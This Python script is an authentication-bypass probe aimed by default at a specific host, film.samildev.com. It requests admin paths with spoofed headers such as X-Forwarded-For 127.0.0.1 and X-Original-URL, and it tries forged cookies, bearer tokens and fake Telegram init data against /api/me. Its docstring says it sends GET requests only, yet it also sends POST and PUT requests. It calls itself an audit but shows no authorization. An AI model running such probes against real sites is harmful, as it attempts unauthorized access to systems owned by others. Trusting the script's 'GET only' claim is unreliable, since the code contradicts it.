"""Probe how the app behind the gate authenticates a caller.

Two questions, both answered by comparing responses:

1. Does ``/admin`` trust a client-controllable header for its access check?
2. Which credential does the API accept, and does any forged or malformed
   credential change the answer?

GET only. No payloads, no state change. The point is to read the shape of the
authentication, not to brute force it.
"""

from __future__ import annotations

import argparse

import httpx

ADMIN_PATHS = ("/admin", "/admin/", "/admin/login", "/admin/index.html", "/admin/dashboard")

SPOOF_HEADERS = (
    {},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-For": "::1"},
    {"X-Forwarded-For": "10.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Original-URL": "/admin"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1"},
)

CREDENTIALS = (
    {},
    {"Cookie": "session=1"},
    {"Cookie": "rave_session=1"},
    {"Cookie": "tg_session=1"},
    {"Cookie": "sid=1"},
    {"Cookie": "token=1"},
    {"Cookie": "auth=1"},
    {"Cookie": "session=1; rave_session=1"},
    {"Authorization": "Bearer 1"},
    {"Authorization": "Bearer null"},
    {"X-Session-Token": "1"},
    {"X-Session": "1"},
    {"X-Telegram-Init-Data": "auth_date=1&hash=0"},
    {"X-Init-Data": "auth_date=1&hash=0"},
)


def show(label: str, response: httpx.Response) -> None:
    body = response.text.replace("\n", " ")[:120]
    print(f"  {label:52} {response.status_code:<4} len={len(response.content):<6} {body}")


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="https://film.samildev.com")
    args = parser.parse_args()

    with httpx.Client(
        base_url=args.target, timeout=15, follow_redirects=False,
        headers={"User-Agent": "rave-gate-audit/1.0"},
    ) as client:
        print("=== ADMIN PATHS ===")
        for path in ADMIN_PATHS:
            show(f"GET {path}", client.get(path))

        print("=== ADMIN: SPOOFED CLIENT IDENTITY ===")
        for headers in SPOOF_HEADERS:
            label = ", ".join(f"{k}: {v}" for k, v in headers.items()) or "(none)"
            show(label, client.get("/admin", headers=headers))

        print("=== API CREDENTIAL SHAPES (/api/me) ===")
        for headers in CREDENTIALS:
            label = ", ".join(f"{k}: {v}" for k, v in headers.items()) or "(none)"
            show(label, client.get("/api/me", headers=headers))

        print("=== QUERY CREDENTIALS (/api/me) ===")
        for query in ("session=1", "token=1", "init_data=x", "tg=1"):
            show(f"?{query}", client.get(f"/api/me?{query}"))

        print("=== METHOD PROBES (/api/me) ===")
        for method in ("POST", "PUT", "OPTIONS", "HEAD"):
            response = client.request(method, "/api/me")
            print(f"  {method:52} {response.status_code:<4} allow={response.headers.get('allow','-')}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
